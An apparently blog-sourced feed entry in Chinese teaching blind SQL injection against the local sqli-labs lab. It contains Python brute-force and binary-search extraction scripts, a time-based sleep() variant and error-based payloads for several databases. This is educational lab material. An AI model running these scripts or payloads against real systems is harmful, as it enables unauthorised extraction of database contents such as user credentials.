    <content type="html"><![CDATA[<p>起源是上交高校运维比赛（EIS_CTF）其中的一道盲注题，所以使用sqli-labs进行一个复习，权当是盲注的一个复习。<br><a id="more"></a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所有的测试均为无WAF的情况下进行。</p><h2 id="注释关键字"><a href="#注释关键字" class="headerlink" title="注释关键字"></a>注释关键字</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--   # 单行注释，两个-连接符后面紧跟着一个空格</span><br><span class="line"># # 单行注释</span><br><span class="line">/**/ # 多行注释</span><br></pre></td></tr></table></figure><p>实践效果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT username,password FROM `users` WHERE id = &apos;2&apos;#&apos; LIMIT 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----------+------------+</span><br><span class="line">| username | password   |</span><br><span class="line">+----------+------------+</span><br><span class="line">| Angelina | I-kill-you |</span><br><span class="line">+----------+------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT username,password FROM `users` WHERE id = &apos;2&apos;-- &apos; LIMIT 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----------+------------+</span><br><span class="line">| username | password   |</span><br><span class="line">+----------+------------+</span><br><span class="line">| Angelina | I-kill-you |</span><br><span class="line">+----------+------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure></p><p>都是可以正常得到查询的结果<br>说明后面的SQL语句已经被我们注释掉了</p><h2 id="Sql注入截取字符串常用函数"><a href="#Sql注入截取字符串常用函数" class="headerlink" title="Sql注入截取字符串常用函数"></a>Sql注入截取字符串常用函数</h2><p>在不回显的情况下，多数情况下都会用到截取字符串的问题，也就是在盲注的情况下，需要一个一个字符的去猜解，其中就需要截取字符串。</p><h3 id="mid-函数"><a href="#mid-函数" class="headerlink" title="mid()函数"></a>mid()函数</h3><p>语法为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT MID(column_name,start[,length]) FROM table_name;</span><br></pre></td></tr></table></figure></p><ul><li>column_name    必需。要提取字符的字段。<ul><li>start         必需。规定开始位置（起始值是 1）。<ul><li>length可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。<br>我们就直接使用<code>sqli-labs</code>的数据库进行演示。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">database()为security </span><br><span class="line">mysql&gt; select mid(database(),1,4);</span><br><span class="line">+---------------------+</span><br><span class="line">| mid(database(),1,4) |</span><br><span class="line">+---------------------+</span><br><span class="line">| secu                |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><p>其中<code>column_name</code>内容可为自行构造的sql语句。</p><h3 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h3><p>语法为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUBSTR(column_name,start[,length]) FROM table_name;</span><br></pre></td></tr></table></figure></p><p>描述和用法与<code>mid()</code>函数是一样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1);</span><br><span class="line">+--------------------------------------------------------------------------------------------------------+</span><br><span class="line">| substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1) |</span><br><span class="line">+--------------------------------------------------------------------------------------------------------+</span><br><span class="line">| e                                                                                                      |</span><br><span class="line">+--------------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure></p><h3 id="Left-函数"><a href="#Left-函数" class="headerlink" title="Left()函数"></a>Left()函数</h3><p>语法为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LEFT(ARG,LENGTH) FROM table_name;</span><br></pre></td></tr></table></figure></p><p>取一个字符串的前若干位<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select left(database(),4);</span><br><span class="line">+--------------------+</span><br><span class="line">| left(database(),4) |</span><br><span class="line">+--------------------+</span><br><span class="line">| secu               |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure></p><h1 id="布尔SQL盲注"><a href="#布尔SQL盲注" class="headerlink" title="布尔SQL盲注"></a>布尔SQL盲注</h1><p>用sqli-labs的第6题作为例子<br><img src="/image/MySQL-盲注浅析/sqli_labs_6_1.png" alt="sqli_labs_6_1"></p><p>先手工fuzz一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.100/sqli-labs/Less-6/?id=-1</span><br><span class="line">http://192.168.2.100/sqli-labs/Less-6/?id=1&apos;</span><br><span class="line">http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;</span><br></pre></td></tr></table></figure></p><p><code>&quot;</code>报错，继续fuzz<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;and&quot;1&quot;=&quot;1</span><br><span class="line">http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;and&quot;1&quot;=&quot;2</span><br></pre></td></tr></table></figure></p><p>存在注入，但是没有回显，判断为可盲注。<br>测试一下(其实盲注的脚本真的就只是这几行，难度无非是在waf过滤函数的替换绕过)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># ! usr/bin/env python</span><br><span class="line">#  -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&apos;</span><br><span class="line">print(&quot;获取数据库长度&quot;)</span><br><span class="line">for i in range(1, 32):</span><br><span class="line">    payload = &quot;and length(database())=%d--+&quot; % i</span><br><span class="line">    res = requests.get(url + payload)</span><br><span class="line">    if &quot;You are in...........&quot; in res.text:</span><br><span class="line">        print(&quot;[+]数据库长度为:&quot; + str(i) + &quot;位&quot;)</span><br><span class="line">        break</span><br><span class="line">结果为</span><br><span class="line">/usr/bin/python2.7 /home/rcoil/PycharmProjects/demo/demo.py</span><br><span class="line">获取数据库长度</span><br><span class="line">[+]数据库长度为:8位</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure></p><p>所以证明注入确实存在且为盲注,浏览器验证下。<br><img src="/image/MySQL-盲注浅析/sqli_labs_6_2.png" alt="sqli_labs_6_2"></p><h2 id="获取数据库名字"><a href="#获取数据库名字" class="headerlink" title="获取数据库名字"></a>获取数据库名字</h2><p>先测试（fuzz）<br><img src="/image/MySQL-盲注浅析/sqli_labs_6_3.png" alt="sqli_labs_6_3"><br>发现是可行的。然后写脚本进行猜解。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># ! usr/bin/env python</span><br><span class="line">#  -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&apos;</span><br><span class="line">print(&quot;获取数据库名字&quot;)</span><br><span class="line">database = &apos;&apos;</span><br><span class="line">for i in range(1, 10):</span><br><span class="line">    for j in range(97, 123):</span><br><span class="line">        payload = &quot;and mid(database(),1,%d)=&apos;%s&apos;--+&quot; % (i, database + chr(j))</span><br><span class="line">        res = requests.get(url + payload)</span><br><span class="line">        if &quot;You are in...........&quot; in res.text:</span><br><span class="line">            database += chr(j)</span><br><span class="line">            print(&quot;[-]当前猜解:&quot; +database)</span><br><span class="line">            break</span><br><span class="line">print(&quot;[+]当前数据库:&quot; +database)</span><br></pre></td></tr></table></figure></p><p>如果出现编码问题，要注意的是<code>headers</code>中<code>Content-Type</code>的值，必要的时候带入<code>headers</code>进行访问</p><h2 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select mid((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,2);</span><br><span class="line">+-----------------------------------------------------------------------------------------------------+</span><br><span class="line">| mid((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,2) |</span><br><span class="line">+-----------------------------------------------------------------------------------------------------+</span><br><span class="line">| em                                                                                                  |</span><br><span class="line">+-----------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure><p>所以接下来代码为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># ! usr/bin/env python</span><br><span class="line">#  -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&apos;</span><br><span class="line">table_names = &apos;&apos;</span><br><span class="line">for i in range(0, 8):</span><br><span class="line">    for k in range(1, 32):</span><br><span class="line">        for j in range(97, 123):</span><br><span class="line">            payload = &quot;and mid((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit %d,1),1,%d)=&apos;%s&apos;--+&quot; % (i, k, table_names+chr(j))</span><br><span class="line">            request = requests.get(url + payload)</span><br><span class="line">            if &quot;You are in&quot; in request.text:</span><br><span class="line">                table_names += chr(j)</span><br><span class="line">                print(&quot;第&quot; + str(i + 1) + &quot;张表的名字为&quot; + table_names)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure></p><p>我发现，如果想要优雅一些，用<code>ascii()</code>或者改变<code>k</code>的位置<br>比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(mid((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit %d,1),%d,1))=&apos;%d&apos;--+&quot; % (i, k, j)</span><br></pre></td></tr></table></figure></p><p>但是这样子的话，到最后，所有的<code>table_names</code>都拼接一起（后面补充）。</p><h2 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select mid((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 1,1),1,4);</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| mid((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 1,1),1,4) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| user                                                                                                                         |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure><p>代码和上面的没区别<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># ! usr/bin/env python</span><br><span class="line">#  -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&apos;</span><br><span class="line">column_names = &apos;&apos;</span><br><span class="line">for i in range(0, 8):</span><br><span class="line">    for k in range(1, 32):</span><br><span class="line">        for j in range(97, 123):</span><br><span class="line">            payload = &quot;and ascii(mid((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit %d,1),%d,1))=&apos;%d&apos;--+&quot; % (i, k, j)</span><br><span class="line">            request = requests.get(url + payload)</span><br><span class="line">            if &quot;You are in&quot; in request.text:</span><br><span class="line">                column_names += chr(j)</span><br><span class="line">                print(&quot;第&quot; + str(i + 1) + &quot;列字段名为&quot; + column_names)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure></p><h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># ! usr/bin/env python</span><br><span class="line">#  -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&apos;</span><br><span class="line">column_names = &apos;&apos;</span><br><span class="line">for i in range(0, 8):</span><br><span class="line">    for k in range(1, 32):</span><br><span class="line">        for j in range(21, 127):</span><br><span class="line">            payload = &quot;and ascii(mid((select username from security.users limit %d,1),%d,1))=&apos;%d&apos;--+&quot; % (i, k, j)</span><br><span class="line">            request = requests.get(url + payload)</span><br><span class="line">            if &quot;You are in&quot; in request.text:</span><br><span class="line">                column_names += chr(j)</span><br><span class="line">                print(&quot;第&quot; + str(i + 1) + &quot;行数据为&quot; + column_names)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure><p>这个布尔SQL盲注暂时分析到这里。如果想要一脚本搞定以上所有的内容，那就<code>def</code>一下就很方便调用了。<br>写到这里的时候，我发现，所有的脚本都有很多的相同点，只需要更换变量就可以直接使用。而且，在去翻资料的过程中，我发现在bool盲注中二分法比穷举要快一些，所以我参照王一航的思路进行改写。<br><img src="/image/MySQL-盲注浅析/sqli_labs_6_4.png" alt="sqli_labs_6_4"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding:utf8</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.2.100/sqli-labs/Less-6/?id=&quot;</span><br><span class="line"></span><br><span class="line"># 定义payload</span><br><span class="line">def exce(database_name, table_name, column_name, Result, Char, mid):</span><br><span class="line">    global url</span><br><span class="line">    esndStr = &quot; and\&quot;1\&quot;=\&quot;1&quot;</span><br><span class="line">    payload = &quot;1\&quot;and(ascii(mid((select &quot; + column_name + &quot; from &quot; + database_name + &quot;.&quot; + table_name + &quot;  limit &quot; + Result + &quot;,1),&quot; + Char + &quot;,1))&gt;&quot; + mid + &quot;)&quot;</span><br><span class="line">    tempurl = url + payload + esndStr</span><br><span class="line">    request = requests.get(tempurl).text</span><br><span class="line">    if &quot;You are in...........&quot; in request:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"># 二分查询</span><br><span class="line">def doubleSearch(database_name, table_name, column_name, Result, Char, left_number, right_number):</span><br><span class="line">    while left_number &lt; right_number:</span><br><span class="line">        mid = int((left_number + right_number) / 2)</span><br><span class="line">        if exce(database_name, table_name, column_name, str(Result),str(Char + 1),str(mid)):</span><br><span class="line">            left_number = mid</span><br><span class="line">        else:</span><br><span class="line">            right_number = mid</span><br><span class="line">        if right_number-left_number == 1:</span><br><span class="line">            if exce(database_name, table_name, column_name, str(Result),str(Char + 1),str(mid)):</span><br><span class="line">                mid += 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line">    return chr(mid)</span><br><span class="line"></span><br><span class="line"># 定义所有变量初始</span><br><span class="line">def getAllData(database_name, table_name, column_name):</span><br><span class="line">    for i in range(32):</span><br><span class="line">        counter = 0</span><br><span class="line">        for j in range(32):</span><br><span class="line">            counter += 1</span><br><span class="line">            temp = doubleSearch(database_name, table_name, column_name, i, j, 0, 127) # 从255开始查询</span><br><span class="line">            if ord(temp) == 1:</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">            sys.stdout.write(temp)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">        if counter == 1: </span><br><span class="line">            break</span><br><span class="line">        sys.stdout.write(&quot;\r\n&quot;)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">def getAllSchemaNames():</span><br><span class="line">    return getAllData(column_name=&quot;schema_name&quot;, table_name=&quot;schemata&quot;, database_name=&quot;information_schema&quot;)</span><br><span class="line">getAllSchemaNames()</span><br></pre></td></tr></table></figure></p><p>大致思想：<br>1、mid为left和right的中间值，mid是否和left相等（right-left=1），相等跳到5，如果不等跳到2<br>2、请求mid，如果返回正确的页面跳到3，如果返回错误的页面跳到4<br>3、返回页面正确，将left赋值为mid<br>4、返回页面错误，将right赋值为mid<br>5、返回mid值</p><p>二分法它的原理是把可能出现的字符看做一个有序的序列，这样在查找所要查找的元素时,首先与序列中间的元素进行比较,如果大于这个元素,就在当前序列的后半部分继续查找,如果小于这个元素,就在当前序列的前半部分继续查找,直到找到相同的元素,或者所查找的序列范围为空为止。</p><p>如果需要查找数据表和数据表的内容，在<code>getAllSchemaNames()</code>添加个<code>where语句</code></p><h1 id="时间的SQL盲注"><a href="#时间的SQL盲注" class="headerlink" title="时间的SQL盲注"></a>时间的SQL盲注</h1><p>延时注入是主要针对页面无变化、无法用布尔真假判断、无法报错的情况下的注入技术。</p><p>延迟注入主要点是在于<code>if()函数</code>的判断、<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(condition,true,false)               //条件语句</span><br></pre></td></tr></table></figure></p><ul><li>condition 是判断条件</li><li>true 和false 是符合condition自定义的返回结果。</li></ul><p>本地测试感受一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ascii(mid(database(),1,1));</span><br><span class="line">+----------------------------+</span><br><span class="line">| ascii(mid(database(),1,1)) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                        115 |</span><br><span class="line">+----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select if(ascii(mid(database(),1,1))=115,sleep(5),1);</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| if(ascii(mid(database(),1,1))=115,sleep(5),1) |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             0 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (5.01 sec) </span><br><span class="line"></span><br><span class="line">mysql&gt; select if(ascii(mid(database(),1,1))=114,sleep(5),1);</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| if(ascii(mid(database(),1,1))=114,sleep(5),1) |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             1 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>如果<code>condition</code>判断为正确，则产生延迟，否则不产生延迟。<br>至于脚本，修改下上面的脚本进行判断即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;http://192.168.2.100/sqli-labs/Less-9/?id=&quot;</span><br><span class="line">esndStr = &quot; and sleep(3))--+&quot;</span><br><span class="line">payload = &quot;1&apos; and ((ascii(mid((select &quot; + column_name + &quot; from &quot; + database_name + &quot;.&quot; + table_name + &quot;  limit &quot; + Result + &quot;,1),&quot; + Char + &quot;,1))&gt;&quot; + mid + &quot;)&quot;</span><br><span class="line">tempurl = url + payload + esndStr</span><br><span class="line">before_time = time.time()</span><br><span class="line">requests.head(tempurl)</span><br><span class="line">after_time = time.time()</span><br><span class="line">use_time = after_time - before_time</span><br><span class="line">if abs(use_time) &lt; 0.1:</span><br><span class="line">    return True</span><br><span class="line">else:</span><br><span class="line">    return False</span><br></pre></td></tr></table></figure></p><h1 id="报错的SQL盲注"><a href="#报错的SQL盲注" class="headerlink" title="报错的SQL盲注"></a>报错的SQL盲注</h1><p>如果页面上显示数据的报错信息，那么可以直接使用报错的方式把想要的信息爆出来。</p><p>比如在mysql中我们可以使用如下的经典语句进行报错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2 union select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br></pre></td></tr></table></figure></p><p>这是网上流传很广的一个版本，可以简化成如下的形式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure></p><p>如果关键的表被禁用了，可以使用这种形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure></p><p>如果rand被禁用了可以使用用户变量来报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</span><br></pre></td></tr></table></figure></p><p>其实这是mysql的一个bug所引起的，其他数据库都不会因为这个问题而报错。</p><p>另外，在mysql5.1版本新加入两个xml函数，也可以用来报错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from article where id = 1 and extractvalue(1, concat(0x5c,(select pass from admin limit 1)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;\admin888&apos;  </span><br><span class="line">mysql&gt; select * from article where id = 1 and 1=(updatexml(1,concat(0x5e24,(select pass from admin limit 1),0x5e24),1));  </span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;^$admin888^$&apos;</span><br></pre></td></tr></table></figure></p><p>而在其他数据库中也可以使用不同的方法构成报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PostgreSQL: /?param=1 and(1)=cast(version() as numeric)-- </span><br><span class="line">MSSQL: /?param=1 and(1)=convert(int,@@version)-- </span><br><span class="line">Sybase: /?param=1 and(1)=convert(int,@@version)-- </span><br><span class="line">Oracle &gt;=9.0: /?param=1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select </span><br><span class="line">replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)--</span><br></pre></td></tr></table></figure></p><p>参考：<br><a href="http://www.freebuf.com/articles/web/30841.html" target="_blank" rel="noopener">详解SQL盲注测试高级技巧</a><br><a href="https://www.cnblogs.com/lcamry/p/5763129.html" target="_blank" rel="noopener">MYSQL注入天书之盲注讲解</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;起源是上交高校运维比赛（EIS_CTF）其中的一道盲注题，所以使用sqli-labs进行一个复习，权当是盲注的一个复习。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="https://rcoil.me/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="https://rcoil.me/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="数据库" scheme="https://rcoil.me/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>平衡信息杯-Write-Up</title>
    <link href="https://rcoil.me/2017/10/%E5%B9%B3%E8%A1%A1%E4%BF%A1%E6%81%AF%E6%9D%AF-Write-Up/"/>
    <id>https://rcoil.me/2017/10/平衡信息杯-Write-Up/</id>
    <published>2017-10-21T08:17:24.000Z</published>
    <updated>2017-10-24T14:09:36.224Z</updated>
    
